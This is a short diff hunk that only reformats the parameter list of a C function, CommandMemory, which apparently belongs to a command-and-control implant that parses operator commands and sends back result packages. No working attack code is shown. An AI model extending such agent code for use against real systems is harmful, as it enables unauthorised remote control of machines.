@@ -129,8 +129,9 @@ _Leave:
     PackageTransmit( BK_PACKAGE, NULL, NULL );    
 }
 
-FUNC VOID CommandMemory(_In_ PPARSER Parser) {
-    
+FUNC VOID CommandMemory(
+    _In_ PPARSER Parser
+) {    
     M_MEM MemOp = ParserGetInt32( Parser );
     BK_PACKAGE  = PackageCreate( COMMAND_MEMORY );
     DWORD Err   = 0;
